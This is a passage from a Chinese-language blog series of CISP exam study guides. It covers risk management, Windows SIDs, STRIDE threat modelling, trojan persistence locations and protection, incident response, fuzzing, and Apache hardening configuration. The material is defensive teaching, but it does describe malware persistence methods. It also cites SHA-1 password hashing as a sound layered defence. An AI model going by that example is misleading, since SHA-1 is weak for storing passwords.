影响（Impact）：风险实现后的后果 风险要素关系图： graph TB A[\"资产Assets\"] B[\"威胁Threats\"] C[\"脆弱性Vulnerabilities\"] D[\"风险Risk\"] E[\"影响Impact\"] F[\"保护措施Safeguards\"] A -->|具有| C B -->|利用| C B -->|针对| A C -->|导致| D D -->|产生| E F -->|降低| D F -->|保护| A F -->|减少| C style A fill:#e3f2fd,stroke:#1976d2 style B fill:#ffebee,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#ffcdd2,stroke:#c62828 style F fill:#e8f5e9,stroke:#388e3d 1.3 降低风险的方法 ✅ 正确的风险降低方法组织应该根据风险建立相应的保护要求，通过构建防护措施降低风险对组织产生的影响。 这是最全面和正确的风险管理方法。 为什么其他选项不够全面： 选项 说明 问题 加强防护措施 只关注防护 没有说明如何确定防护需求 减少威胁和脆弱点 只关注威胁和脆弱性 忽略了资产保护和影响评估 减少资产 减少资产数量 不现实，业务需要资产 1.4 风险管理流程 完整的风险管理流程： graph LR A[\"风险识别\"] --> B[\"风险评估\"] B --> C[\"风险处置\"] C --> D[\"风险监控\"] D --> A style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 各阶段详解： 阶段 主要活动 输出 风险识别 识别资产、威胁、脆弱性 风险清单 风险评估 评估风险可能性和影响 风险等级 风险处置 制定和实施防护措施 安全控制措施 风险监控 持续监控和评审 风险报告 1.5 风险处置策略 四种风险处置策略： 🛡️ 风险缓解：实施控制措施降低风险 🔄 风险转移：通过保险等方式转移风险 ✅ 风险接受：接受残余风险 🚫 风险规避：停止相关活动 二、Windows安全标识符（SID） 2.1 SID概述 🔐 Windows SID**安全标识符（Security Identifier, SID）**是标识用户、组和计算机账户的唯一编码。 特点： 在操作系统内部使用 每个账户都有唯一的SID 用于访问控制和权限管理 写入对象的ACL（访问控制列表）中 2.2 SID结构 SID示例： S-1-5-21-1534169462-1651380828-111620652-500 SID结构解析： graph LR A[\"S\"] --> B[\"1\"] B --> C[\"5\"] C --> D[\"21\"] D --> E[\"1534169462\"] E --> F[\"1651380828\"] F --> G[\"111620652\"] G --> H[\"500\"] A1[\"前缀\"] --> B1[\"版本号\"] B1 --> C1[\"颁发机构\"] C1 --> D1[\"子颁发机构1\"] D1 --> E1[\"子颁发机构2\"] E1 --> F1[\"子颁发机构3\"] F1 --> G1[\"子颁发机构4\"] G1 --> H1[\"相对标识符RID\"] style A fill:#e3f2fd,stroke:#1976d2 style H fill:#ffebee,stroke:#c62828 SID各部分说明： 部分 值 说明 前缀 S 表示这是一个SID 版本号 1 SID版本 颁发机构 5 Windows NT颁发机构 子颁发机构标识符 21 第一个子颁发机构 域标识符 1534169462-1651380828-111620652 三个子颁发机构组成域标识 RID 500 相对标识符 2.3 常见RID值 内置账户的RID： RID 账户类型 说明 500 Administrator 内置管理员账户 501 Guest 内置来宾账户 502 KRBTGT Kerberos服务账户 512 Domain Admins 域管理员组 513 Domain Users 域用户组 ⚠️ 常见错误错误说法：SID以500结尾表示内置Guest账户。 ❌ 为什么这是错误的： 500是Administrator（管理员）账户 501才是Guest（来宾）账户 ✅ 正确理解： RID 500 = Administrator RID 501 = Guest 2.4 SID的作用 SID在Windows安全中的应用： 🔑 身份识别：唯一标识用户和组 🛡️ 访问控制：ACL中使用SID进行权限检查 📝 审计日志：记录操作者的SID 🔄 账户迁移：即使用户名改变，SID保持不变 查看SID的方法： # 查看当前用户SID whoami &#x2F;user # 查看所有用户SID wmic useraccount get name,sid # 使用PowerShell查看 Get-LocalUser | Select-Object Name, SID 三、STRIDE威胁建模 3.1 STRIDE概述 🎯 STRIDE威胁建模STRIDE是微软SDL（Security Development Lifecycle）中提出的威胁建模方法。 将威胁分为六类，为每一类威胁提供标准的缓解措施。 3.2 STRIDE六类威胁 STRIDE威胁分类： 威胁类型 英文 说明 安全属性 Spoofing 欺骗 冒充他人身份 身份认证 Tampering 篡改 修改数据或代码 完整性 Repudiation 否认 否认执行过某操作 不可否认性 Information Disclosure 信息泄露 未授权访问信息 机密性 Denial of Service 拒绝服务 使服务不可用 可用性 Elevation of Privilege 权限提升 获得未授权的权限 授权 3.3 Spoofing（欺骗）威胁 🎭 欺骗威胁**Spoofing（欺骗）**是指攻击者冒充他人身份进行操作。 典型场景： 使用他人的用户名和密码登录 伪造IP地址 伪造电子邮件发件人 会话劫持 欺骗威胁示例分析： ✅ 正确答案网站使用用户名、密码进行登录验证，攻击者可能会利用弱口令或其他方式获得用户密码，以该用户身份登录修改用户订单等信息。 这是典型的**身份欺骗（Spoofing）**威胁。 其他选项分析： 威胁描述 威胁类型 说明 DDoS攻击降低访问速度 Denial of Service 拒绝服务 HTTP未加密导致信息泄露 Information Disclosure 信息泄露 HTTP无法确认数据完整性 Tampering 篡改 弱口令导致身份冒充 Spoofing 欺骗 ✅ 3.4 STRIDE威胁与缓解措施 各类威胁的缓解措施： 威胁 缓解措施 技术实现 Spoofing 身份认证 多因素认证、数字证书、生物识别 Tampering 完整性保护 数字签名、哈希校验、访问控制 Repudiation 审计日志 日志记录、数字签名、时间戳 Information Disclosure 加密保护 TLS/SSL、数据加密、访问控制 Denial of Service 可用性保护 限流、负载均衡、冗余设计 Elevation of Privilege 授权控制 最小权限、权限分离、输入验证 3.5 威胁建模流程 STRIDE威胁建模步骤： graph LR A[\"1. 识别资产\"] --> B[\"2. 创建架构图\"] B --> C[\"3. 识别威胁\"] C --> D[\"4. 评估风险\"] D --> E[\"5. 制定缓解措施\"] E --> F[\"6. 验证和测试\"] style A fill:#e3f2fd,stroke:#1976d2 style C fill:#ffebee,stroke:#c62828 style E fill:#e8f5e9,stroke:#388e3d 四、木马后门防护 4.1 木马后门概述 🦠 木马后门木马后门是一种恶意软件，允许攻击者远程访问和控制受害者的计算机。 典型特征： 隐蔽性强 持久化驻留 远程控制能力 窃取信息 4.2 木马持久化技术 常见持久化方法： 方法 说明 示例 注册表启动项 修改注册表自动启动 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 计划任务 创建定时任务 Task Scheduler 服务 注册为系统服务 Windows Services 启动文件夹 放入启动文件夹 Startup folder DLL劫持 替换系统DLL 利用DLL搜索顺序 注册表启动项示例： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 4.3 木马防护措施 有效的防护措施： ✅ 不下载、不执行、不接收来历不明的软件 ✅ 不随意打开来历不明的邮件，不浏览不健康不正规的网站 ✅ 安装反病毒软件和防火墙，安装专门的木马防治软件 ⚠️ 无效的防护措施使用共享文件夹对防范木马后门攻击是无用的。 ❌ 为什么无效： 共享文件夹反而增加了攻击面 可能成为木马传播的途径 不能阻止木马的执行和持久化 ✅ 正确做法： 限制或禁用不必要的共享 对共享文件夹设置严格的访问控制 定期扫描共享文件夹 4.4 木马检测与清除 检测方法： 🔍 进程监控：检查可疑进程 📝 注册表检查：检查启动项 🌐 网络监控：检测异常网络连接 📊 行为分析：监控异常行为 清除步骤： 断开网络连接 进入安全模式 使用杀毒软件扫描 手动清理注册表和文件 修改密码 系统加固 五、信息安全应急响应 5.1 应急响应概述 🚨 应急响应信息安全应急响应是组织在发生安全事件时，采取的一系列措施来检测、遏制、根除和恢复的过程。 目标： 快速响应安全事件 最小化损失和影响 恢复正常运营 总结经验教训 5.2 应急响应阶段 广为接受的应急响应六阶段模型： graph LR A[\"1. 准备Preparation\"] --> B[\"2. 检测Detection\"] B --> C[\"3. 遏制Containment\"] C --> D[\"4. 根除Eradication\"] D --> E[\"5. 恢复Recovery\"] E --> F[\"6. 跟踪总结Lessons Learned\"] F -.-> A style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#ffebee,stroke:#c62828 style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#e8f5e9,stroke:#388e3d style F fill:#e1f5fe,stroke:#0277bd 六个阶段详解： 阶段 主要活动 关键输出 1. 准备 制定计划、建立团队、准备工具 应急响应计划 2. 检测 监控、识别安全事件 事件报告 3. 遏制 隔离受影响系统、防止扩散 遏制措施 4. 根除 清除恶意代码、修复漏洞 清理报告 5. 恢复 恢复系统和服务 恢复确认 6. 跟踪总结 分析事件、改进流程 总结报告 5.3 应急响应关键点 ⚠️ 常见误解错误说法：应急响应方法一定能确保事件处理的成功。 ❌ 为什么这是错误的： 应急响应方法不是万能的 事件的复杂性和不确定性 依赖于执行质量和资源 可能遇到未知的威胁 ✅ 正确理解： 应急响应方法提供了最佳实践框架 有助于提高成功率，但不能保证100%成功 需要根据实际情况灵活调整 持续改进和优化 5.4 应急响应最佳实践 准备阶段的关键活动： 📋 制定应急响应计划 👥 建立应急响应团队 🛠️ 准备应急工具包 🎓 定期培训和演练 📞 建立沟通机制 检测阶段的关键活动： 🔍 部署监控系统 📊 分析日志和告警 🚨 建立事件报告机制 ⏱️ 快速响应机制 遏制阶段的策略： 🔒 短期遏制：快速隔离，防止扩散 🛡️ 长期遏制：临时修复，维持业务 📝 保留证据 六、安全设计原则 6.1 安全设计原则概述 🏗️ 安全设计原则安全设计原则是在系统设计和开发过程中应遵循的基本准则，用于构建安全的系统。 6.2 纵深防御原则 🛡️ 纵深防御（Defense in Depth）纵深防御是指在系统的多个层次部署多种安全控制措施，形成多层防护体系。 核心思想： 不依赖单一防护措施 多层次、多维度的防护 即使一层被突破，其他层仍能提供保护 纵深防御示例： ✅ 纵深防御实践某购物网站的安全设计： 用户名口令认证（第一层防护） 数字证书身份认证（第二层防护） 口令使用SHA-1加密存储（第三层防护） 这是典型的纵深防御原则应用。 纵深防御层次： graph TB A[\"物理安全\"] B[\"网络安全\"] C[\"主机安全\"] D[\"应用安全\"] E[\"数据安全\"] A --> B B --> C C --> D D --> E A1[\"门禁、监控\"] --> B1[\"防火墙、IDS\"] B1 --> C1[\"操作系统加固\"] C1 --> D1[\"认证、授权\"] D1 --> E1[\"加密、备份\"] style A fill:#e3f2fd,stroke:#1976d2 style B fill:#fff3e0,stroke:#f57c00 style C fill:#e8f5e9,stroke:#388e3d style D fill:#f3e5f5,stroke:#7b1fa2 style E fill:#ffebee,stroke:#c62828 6.3 其他安全设计原则 常见安全设计原则： 原则 说明 示例 最小权限 只授予完成任务所需的最小权限 普通用户不应有管理员权限 职责分离 关键操作需要多人协作 财务审批需要多级审核 纵深防御 多层次防护 认证+授权+加密+审计 最少共享机制 减少共享资源 独立的数据库实例 默认安全 默认配置应该是安全的 默认禁用不必要的服务 失败安全 失败时保持安全状态 认证失败时拒绝访问 开放设计 安全不依赖于设计的保密性 使用公开的加密算法 6.4 最小权限原则 最小权限原则（Principle of Least Privilege）： 🔑 用户只获得完成工作所需的最小权限 ⏱️ 权限只在需要时授予 🔄 定期审查和回收权限 📊 记录权限使用情况 示例： # 不好的做法 用户A：管理员权限（但只需要读取数据） # 好的做法 用户A：只读权限（满足实际需求） 6.5 职责分离原则 职责分离原则（Separation of Duties）： 👥 关键操作需要多人参与 ✅ 防止单点欺诈 🔄 相互制约和监督 📝 审计追踪 示例： 场景 职责分离实现 财务支付 申请人、审批人、执行人分离 代码发布 开发人员、审核人员、发布人员分离 数据库管理 DBA、应用管理员、安全管理员分离 6.6 最少共享机制原则 最少共享机制原则（Least Common Mechanism）： 🔒 减少共享资源 🛡️ 降低相互影响 🔐 隔离敏感数据 📊 独立的安全域 示例： # 不好的做法 所有应用共享同一个数据库实例 # 好的做法 每个应用使用独立的数据库实例 七、总结 7.1 核心知识点 风险管理： 风险 = 事态的概率 × 结果 降低风险：根据风险建立保护要求，构建防护措施 Windows SID： SID结构：S-版本-颁发机构-子颁发机构-RID RID 500 = Administrator（不是Guest） RID 501 = Guest STRIDE威胁建模： 六类威胁：Spoofing、Tampering、Repudiation、Information Disclosure、Denial of Service、Elevation of Privilege 弱口令导致身份冒充属于Spoofing威胁 木马防护： 有效措施：不下载可疑软件、安装杀毒软件 无效措施：使用共享文件夹 应急响应： 六阶段：准备、检测、遏制、根除、恢复、跟踪总结 不能保证100%成功，但提供最佳实践框架 安全设计原则： 纵深防御：多层次、多维度防护 最小权限：只授予必需的权限 职责分离：关键操作多人参与 最少共享：减少共享资源 7.2 考试要点 💡 考试提示 理解风险要素关系模型 记住SID的结构和常见RID值 掌握STRIDE六类威胁及其对应的安全属性 区分有效和无效的木马防护措施 记住应急响应的六个阶段 理解纵深防御原则的应用场景 相关资源： GB/T 22081 信息安全管理体系 ISO/IEC 13335-1 信息技术安全管理指南 Microsoft SDL威胁建模 NIST SP 800-61 计算机安全事件处理指南","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：软件测试与安全","slug":"2025/10/CISP-Software-Testing-Security-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Software-Testing-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Software-Testing-Security/","excerpt":"深入解析CISP认证中的软件安全测试方法，重点讲解模糊测试（Fuzzing）的原理、流程和应用。","text":"软件安全测试是发现软件漏洞和安全缺陷的重要手段，模糊测试作为一种自动化测试方法，在安全测试中发挥着重要作用。 一、软件安全测试概述 1.1 软件安全测试的重要性 软件安全测试的目标： 🎯 软件安全测试软件安全测试是通过各种测试方法和技术，发现软件中存在的安全漏洞和缺陷，评估软件的安全性。 核心目标： 🔍 发现漏洞 识别安全缺陷 发现潜在威胁 评估安全风险 🛡️ 提升安全性 修复安全问题 加固安全防护 降低安全风险 ✅ 验证有效性 验证安全控制 测试防护措施 确保安全要求 1.2 软件安全测试方法 常见的软件安全测试方法： graph TB A[\"软件安全测试方法\"] B[\"静态测试\"] C[\"动态测试\"] A --> B A --> C B --> B1[\"代码审查\"] B --> B2[\"静态分析\"] B --> B3[\"配置检查\"] C --> C1[\"模糊测试\"] C --> C2[\"渗透测试\"] C --> C3[\"漏洞扫描\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 测试方法对比： 测试方法 类型 特点 优势 局限性 代码审查 静态 人工检查代码 深入全面 耗时耗力 静态分析 静态 工具自动分析 快速高效 误报率高 模糊测试 动态 异常输入测试 发现未知漏洞 覆盖率有限 渗透测试 动态 模拟攻击 真实场景 需要专业技能 漏洞扫描 动态 自动化扫描 快速便捷 仅发现已知漏洞 二、模糊测试（Fuzzing） 2.1 模糊测试概述 模糊测试的定义： 💡 什么是模糊测试模糊测试（Fuzzing）是一种自动化的软件测试技术，通过向程序输入大量随机、畸形或异常的数据，监测程序的异常行为，从而发现潜在的安全漏洞。 核心特点： 🎲 随机性 生成随机测试数据 模拟异常输入 覆盖边界情况 🤖 自动化 自动生成测试用例 自动执行测试 自动监测异常 🔍 黑盒测试 不需要源代码 不需要了解内部结构 关注输入输出行为 graph TB A[\"模糊测试流程\"] B[\"生成测试用例\"] C[\"执行测试\"] D[\"监测异常\"] E[\"分析结果\"] F[\"报告漏洞\"] A --> B B --> C C --> D D --> E E --> F B --> B1[\"随机数据\"] B --> B2[\"畸形数据\"] B --> B3[\"边界值\"] D --> D1[\"崩溃\"] D --> D2[\"挂起\"] D --> D3[\"异常行为\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 style F fill:#ffcdd2,stroke:#c62828 2.2 模糊测试过程 💡 模糊测试过程模糊测试的完整过程包括： 1️⃣ 生成测试用例 ✅ 生成大量随机、畸形、边界值数据 ✅ 模拟异常输入，不是正常用户输入 ✅ 覆盖各种异常情况 2️⃣ 选择测试对象 ✅ 数据处理点：处理外部输入的位置 ✅ 入口点：程序接收输入的接口 ✅ 可信边界：信任域和非信任域的交界 3️⃣ 执行测试 ✅ 向目标程序输入测试数据 ✅ 观察程序运行状态 ✅ 记录测试过程 4️⃣ 监测和记录 ✅ 监测程序异常运行 ✅ 记录崩溃情况 ✅ 捕获异常信息 5️⃣ 分析和重现 ✅ 深入分析崩溃原因 ✅ 必要时手工重现 ✅ 确定漏洞性质 模糊测试详细流程： 模糊测试完整流程： ├── 第一步：确定测试目标 │ ├── 识别测试对象 │ ├── 确定测试范围 │ ├── 选择测试点 │ └── 定义测试目标 ├── 第二步：生成测试用例 │ ├── 随机数据生成 │ │ ├── 完全随机 │ │ ├── 伪随机 │ │ └── 基于种子 │ ├── 畸形数据生成 │ │ ├── 格式错误 │ │ ├── 类型错误 │ │ └── 结构错误 │ └── 边界值生成 │ ├── 最大值 │ ├── 最小值 │ ├── 零值 │ └── 负值 ├── 第三步：选择测试对象 │ ├── 数据处理点 │ │ ├── 文件解析 │ │ ├── 网络协议 │ │ └── API接口 │ ├── 入口点 │ │ ├── 命令行参数 │ │ ├── 配置文件 │ │ └── 用户输入 │ └── 可信边界 │ ├── 外部输入 │ ├── 网络数据 │ └── 文件读取 ├── 第四步：执行测试 │ ├── 输入测试数据 │ ├── 运行目标程序 │ ├── 监控程序状态 │ └── 记录执行过程 ├── 第五步：监测和记录 │ ├── 崩溃检测 │ │ ├── 段错误 │ │ ├── 访问违例 │ │ └── 异常退出 │ ├── 异常检测 │ │ ├── 超时 │ │ ├── 死循环 │ │ └── 资源耗尽 │ └── 日志记录 │ ├── 输入数据 │ ├── 崩溃信息 │ └── 堆栈跟踪 └── 第六步：分析和报告 ├── 深入分析 │ ├── 确定漏洞类型 │ ├── 评估安全影响 │ └── 分析利用可能 ├── 手工重现 │ ├── 验证漏洞 │ ├── 简化测试用例 │ └── 确认触发条件 └── 编写报告 ├── 漏洞描述 ├── 重现步骤 ├── 影响评估 └── 修复建议 2.3 测试用例生成 测试用例的类型： graph TB A[\"测试用例类型\"] B[\"随机数据\"] C[\"畸形数据\"] D[\"边界值数据\"] A --> B A --> C A --> D B --> B1[\"完全随机\"] B --> B2[\"基于模板\"] B --> B3[\"变异生成\"] C --> C1[\"格式错误\"] C --> C2[\"超长字符串\"] C --> C3[\"特殊字符\"] D --> D1[\"最大最小值\"] D --> D2[\"零和负值\"] D --> D3[\"溢出值\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e8f5e9,stroke:#388e3d 测试数据生成策略： 策略 说明 示例 适用场景 随机生成 完全随机的数据 随机字节流 初步测试 变异生成 基于有效数据变异 修改部分字节 格式化数据 模板生成 基于数据模板 按协议格式生成 协议测试 字典生成 使用预定义字典 SQL关键字 特定漏洞 2.4 测试对象选择 重点测试对象： 🎯 模糊测试的重点对象数据处理点（Data Processing Points） 文件解析器：图片、文档、音视频 协议解析器：网络协议、通信协议 数据转换器：编码转换、格式转换 入口点（Entry Points） 命令行参数：程序启动参数 配置文件：配置项和参数 用户输入：表单、对话框 API接口：函数调用接口 可信边界（Trust Boundaries） 外部输入：来自不可信源的数据 网络数据：网络接收的数据 文件读取：外部文件内容 进程间通信：IPC数据 测试对象优先级： 测试对象优先级排序： ├── 高优先级 │ ├── 处理外部输入的代码 │ ├── 网络协议解析 │ ├── 文件格式解析 │ └── 权限检查代码 ├── 中优先级 │ ├── 数据验证代码 │ ├── 字符串处理 │ ├── 内存操作 │ └── 数学运算 └── 低优先级 ├── 内部函数 ├── 辅助功能 └── 日志记录 2.5 异常监测 监测的异常类型： graph TB A[\"异常监测\"] B[\"崩溃异常\"] C[\"性能异常\"] D[\"行为异常\"] A --> B A --> C A --> D B --> B1[\"段错误\"] B --> B2[\"访问违例\"] B --> B3[\"异常退出\"] C --> C1[\"超时\"] C --> C2[\"死循环\"] C --> C3[\"资源耗尽\"] D --> D1[\"输出异常\"] D --> D2[\"状态异常\"] D --> D3[\"逻辑错误\"] style B fill:#ffcdd2,stroke:#c62828 style C fill:#fff3e0,stroke:#f57c00 style D fill:#e3f2fd,stroke:#1976d2 异常监测方法： 监测方法 说明 工具 检测内容 调试器监控 使用调试器附加 GDB, WinDbg 崩溃、异常 系统监控 监控系统调用 strace, Process Monitor 系统调用异常 内存检测 检测内存错误 Valgrind, ASan 内存泄漏、越界 日志分析 分析程序日志 自定义脚本 错误日志 2.6 结果分析 漏洞分析流程： 漏洞分析流程： ├── 1. 初步分析 │ ├── 确认崩溃可重现 │ ├── 收集崩溃信息 │ ├── 分析堆栈跟踪 │ └── 识别崩溃位置 ├── 2. 深入分析 │ ├── 分析崩溃原因 │ │ ├── 缓冲区溢出 │ │ ├── 空指针引用 │ │ ├── 整数溢出 │ │ └── 格式化字符串 │ ├── 评估安全影响 │ │ ├── 拒绝服务 │ │ ├── 信息泄露 │ │ ├── 代码执行 │ │ └── 权限提升 │ └── 分析利用难度 │ ├── 容易利用 │ ├── 中等难度 │ └── 难以利用 ├── 3. 手工重现 │ ├── 简化测试用例 │ ├── 确定最小输入 │ ├── 验证触发条件 │ └── 编写PoC └── 4. 编写报告 ├── 漏洞描述 ├── 影响范围 ├── 重现步骤 ├── 技术细节 └── 修复建议 三、模糊测试的特点 3.1 模糊测试的优势 模糊测试的主要优势： ✅ 模糊测试的优点1️⃣ 黑盒测试方法 不需要了解程序内部结构 不需要源代码 适用于闭源软件 降低测试门槛 2️⃣ 自动化程度高 自动生成测试用例 自动执行测试 自动监测异常 提高测试效率 3️⃣ 发现未知漏洞 不依赖漏洞特征库 可以发现0day漏洞 覆盖意外情况 发现逻辑错误 4️⃣ 适合特定漏洞 输入验证漏洞 边界检查错误 内存安全问题 异常处理缺陷 3.2 模糊测试的局限性 模糊测试的主要局限： ⚠️ 模糊测试的缺点1️⃣ 覆盖率有限 难以覆盖所有代码路径 深层逻辑难以触发 依赖随机性 2️⃣ 需要人工分析 需要分析崩溃原因 需要确定漏洞性质 需要评估安全影响 需要编写利用代码 3️⃣ 误报和漏报 可能产生误报 可能遗漏漏洞 需要人工验证 4️⃣ 资源消耗大 需要大量计算资源 测试时间长 存储空间需求大 3.3 模糊测试工具 常见的模糊测试工具： 工具 类型 特点 适用场景 AFL 覆盖率引导 高效、智能 通用程序 libFuzzer 覆盖率引导 集成LLVM C/C++程序 Peach 基于模板 支持协议 协议测试 Sulley 基于模板 网络协议 网络服务 Radamsa 变异生成 简单易用 文件格式 Honggfuzz 覆盖率引导 多平台 通用程序 四、模糊测试实践 4.1 模糊测试流程 实际应用中的模糊测试流程： graph TB A[\"模糊测试实践\"] B[\"准备阶段\"] C[\"执行阶段\"] D[\"分析阶段\"] E[\"报告阶段\"] A --> B B --> C C --> D D --> E B --> B1[\"选择工具\"] B --> B2[\"配置环境\"] B --> B3[\"准备种子\"] C --> C1[\"启动测试\"] C --> C2[\"监控进度\"] C --> C3[\"收集结果\"] D --> D1[\"分析崩溃\"] D --> D2[\"去重验证\"] D --> D3[\"评估影响\"] E --> E1[\"编写报告\"] E --> E2[\"提交漏洞\"] E --> E3[\"跟踪修复\"] style B fill:#e3f2fd,stroke:#1976d2 style C fill:#e8f5e9,stroke:#388e3d style D fill:#fff3e0,stroke:#f57c00 style E fill:#f3e5f5,stroke:#7b1fa2 4.2 最佳实践 模糊测试的最佳实践： 模糊测试最佳实践： ├── 测试准备 │ ├── 选择合适的工具 │ ├── 准备高质量种子 │ ├── 配置监控环境 │ └── 设置合理参数 ├── 测试执行 │ ├── 持续运行测试 │ ├── 监控测试进度 │ ├── 定期检查结果 │ └── 调整测试策略 ├── 结果分析 │ ├── 及时分析崩溃 │ ├── 去重相同问题 │ ├── 优先处理高危 │ └── 验证漏洞真实性 └── 持续改进 ├── 总结测试经验 ├── 优化测试策略 ├── 更新种子库 └── 改进工具配置 五、总结 软件测试与安全的核心要点： 模糊测试：自动化的黑盒测试方法，通过异常输入发现漏洞 测试流程：生成测试用例→选择测试对象→执行测试→监测异常→分析结果 测试对象：数据处理点、入口点、可信边界是重点 测试特点：自动化程度高，可发现未知漏洞，但需要人工分析 🎯 关键要点 模糊测试模拟异常输入，不是正常用户输入 生成大量随机、畸形、边界值数据作为测试用例 数据处理点、入口点、可信边界是重点测试对象 监测和记录程序异常运行和崩溃情况 深入分析崩溃原因，必要时手工重现 黑盒测试方法，不需要了解程序内部结构 自动化程度高，可以发现未知漏洞 适合发现输入验证、边界检查等问题 需要结合人工分析确定漏洞性质 💡 实践建议 选择合适的模糊测试工具 准备高质量的种子文件 持续运行测试以提高覆盖率 及时分析和验证发现的问题 结合其他测试方法综合评估 建立漏洞管理和跟踪机制","categories":[{"name":"Cybersecurity","slug":"Cybersecurity","permalink":"https://neo01.com/categories/Cybersecurity/"}],"tags":[{"name":"CISP","slug":"CISP","permalink":"https://neo01.com/tags/CISP/"}],"lang":"zh-CN"},{"title":"CISP学习指南：Web服务器与软件安全","slug":"2025/10/CISP-Web-Software-Security-zh-CN","date":"un00fin00","updated":"un33fin33","comments":true,"path":"/zh-CN/2025/10/CISP-Web-Software-Security/","permalink":"https://neo01.com/zh-CN/2025/10/CISP-Web-Software-Security/","excerpt":"深入解析CISP认证中的Web服务器安全配置、拒绝服务攻击防御和软件缺陷密度计算知识点。","text":"Web服务器安全配置和软件安全开发是信息安全的重要实践领域。 一、Apache HTTP Server安全配置 1.1 Apache概述 Apache HTTP Server简介： 🌐 Apache HTTP ServerApache HTTP Server（简称Apache） 是世界上使用最广泛的开源Web服务器软件。 主要特点： 🔓 开源免费 开放源代码 免费使用 社区支持 🔧 高度可配置 模块化设计 灵活配置 扩展性强 🌍 跨平台 支持Windows 支持Linux/Unix 支持macOS 1.2 信息泄露风险 💡 隐藏Apache版本信息Apache HTTP Server在使用过程中，该软件默认会将自己的软件名和版本号发送给客户端。从安全角度出发，为隐藏这些信息，应当采取正确的措施。 错误的做法： ❌ 不选择Windows平台下安装使用 平台选择不能解决版本信息泄露问题 无论在哪个平台，默认都会发送版本信息 ❌ 安装后，删除Apache HTTP Server源码 删除源码不能隐藏版本信息 版本信息是在运行时发送的 与源码是否存在无关 ❌ 从正确的官方网站下载Apache HTTP Server，并安装使用 从官方下载只能保证软件安全性 不能解决版本信息泄露问题 默认配置仍会发送版本信息 正确的做法： ✅ 安装后，修改配置文件httpd.conf中的有关参数 通过修改配置文件可以隐藏版本信息 需要修改ServerTokens和ServerSignature参数 这是正确的安全加固方法 为什么要隐藏版本信息： graph TB A[\"版本信息泄露风险\"] B[\"攻击者获取版本信息\"] C[\"查找已知漏洞\"] D[\"针对性攻击\"] E[\"系统被入侵\"] A --> B B --> C C --> D D --> E B --> B1[\"HTTP响应头\"] B --> B2[\"错误页面\"] C --> C1[\"CVE数据库\"] C --> C2[\"漏洞利用工具\"] D --> D1[\"精准攻击\"] D --> D2[\"提高成功率\"] style A fill:#ffebee,stroke:#c62828 style B fill:#fff3e0,stroke:#f57c00 style C fill:#fff9c4,stroke:#f57f17 style D fill:#ffcdd2,stroke:#d32f2f style E fill:#b71c1c,stroke:#000,color:#fff 1.3 Apache安全配置 隐藏版本信息的配置方法： 🔧 Apache安全配置修改httpd.conf配置文件： 1️⃣ ServerTokens参数 控制HTTP响应头中Server字段显示的信息。 # 默认配置（不安全） ServerTokens Full # 显示：Apache&#x2F;2.4.41 (Unix) PHP&#x2F;7.4.3 # 推荐配置（安全） ServerTokens Prod # 仅显示：Apache # 或更严格 ServerTokens ProductOnly # 仅显示产品名称 **2️⃣ ServerSignature参数** 控制错误页面底部是否显示服务器信息。 # 默认配置（不安全） ServerSignature On # 错误页面显示完整版本信息 # 推荐配置（安全） ServerSignature Off # 错误页面不显示服务器信息 ServerTokens参数值对比： 参数值 显示内容 安全性 推荐 Full Apache/2.4.41 (Unix) PHP/7.4.3 OpenSSL/1.1.1 最低 ❌ OS Apache/2.4.41 (Unix) 低 ❌ Minor Apache/2.4 中 ⚠️ Minimal Apache/2.4.41 中 ⚠️ Major Apache/2 较高 ✅ Prod Apache 高 ✅ 完整的Apache安全配置示例： # httpd.conf 安全配置 # 1. 隐藏版本信息 ServerTokens Prod ServerSignature Off # 2. 禁用目录浏览 &lt;Directory &#x2F;&gt; Options -Indexes AllowOverride None Require all denied &lt;&#x2F;Directory&gt; # 3. 限制HTTP方法 &lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&quot;&gt; &lt;LimitExcept GET POST HEAD&gt; Require all denied &lt;&#x2F;LimitExcept&gt; &lt;&#x2F;Directory&gt; # 4. 设置超时 Timeout 60 KeepAliveTimeout 5 # 5. 限制请求大小 LimitRequestBody 10485760 # 6. 禁用不必要的模块 # LoadModule status_module modules&#x2F;mod_status.so # LoadModule info_module modules&#x2F;mod_info.so # 7. 设置安全响应头 Header always set X-Frame-Options &quot;SAMEORIGIN&quot; Header always set X-Content-Type-Options &quot;nosniff&quot; Header always set X-XSS-Protection &quot;1; mode&#x3D;block&quot; 1.4 其他Web服务器安全措施 Web服务器安全加固清单： Web服务器安全加固： ├── 信息隐藏 │ ├── 隐藏版本信息 │ ├── 自定义错误页面 │ ├── 移除默认页面 │ └── 禁用服务器状态页 ├── 访问控制 │ ├── 限制目录访问 │ ├── 禁用目录浏览 │ ├── 限制HTTP方法 │ └── IP白名单 ├── 资源限制 │ ├── 设置超时时间 │ ├── 限制请求大小 │ ├── 限制并发连接 │ └── 防止资源耗尽 ├── 模块管理 │ ├── 禁用不必要模块 │ ├── 只加载必需模块 │ ├── 定期更新模块 │ └── 审查第三方模块 └── 日志审计 ├── 启用访问日志 ├── 启用错误日志 ├── 定期审查日志 └── 集中日志管理 二、拒绝服务攻击防御 2.1 拒绝服务攻击概述 DoS攻击的定义： ⚠️ 